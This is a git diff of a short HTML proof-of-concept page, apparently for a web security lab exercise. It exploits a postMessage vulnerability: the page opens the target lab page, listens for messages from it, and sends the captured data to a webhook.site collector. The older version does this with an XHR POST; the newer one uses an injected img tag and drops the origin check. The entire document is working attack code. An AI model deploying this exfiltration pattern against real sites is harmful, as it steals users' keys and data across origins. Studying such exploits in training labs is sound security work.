@@ -1,31 +1,30 @@
-<!DOCTYPE html>
-<html lang="en">
+<html>
+
 <head>
-    <meta charset="UTF-8">
-    <title>Exploit PostMessage Vulnerability</title>
-</head>
-<body>
+
+    <title>PoC</title>
+
     <script>
-        // Function to send data to your server
-        function sendToServer(data) {
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://webhook.site/4314bf30-5ce3-4919-a7ea-d88e77b2eb85/?data", true);
-            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-            xhr.send(JSON.stringify(data));
-        }
+    function listener(event) {
+        document.write("<img src='https://webhook.site/4314bf30-5ce3-4919-a7ea-d88e77b2eb85/?data="+event.data+"'></img>");
+    }
+    if (window.addEventListener){
 
-        // Listen for the message from the vulnerable site
-        window.addEventListener("message", function(event) {
-            // Make sure the message is from the expected origin
-            if (event.origin === "http://ptl-4b6d7b26-f4e36987.libcurl.so") {
-                // Send the received data to your server
-                sendToServer(event.data);
-            }
-        }, false);
+        addEventListener("message", listener, false);
 
-        // Open the vulnerable page in a new window
-        var newWindow = window.open("http://ptl-4b6d7b26-f4e36987.libcurl.so/key/0", "ptlabdata0", "height=200,width=150");
+    } else {
+
+        attachEvent("onmessage", listener);
+
+    }
 
     </script>
+
+</head>
+
+<body>
+
+    <script>window.open('http://ptl-c1cb5798-5d605bfc.libcurl.so/key/0');</script>
+
 </body>
 </html>
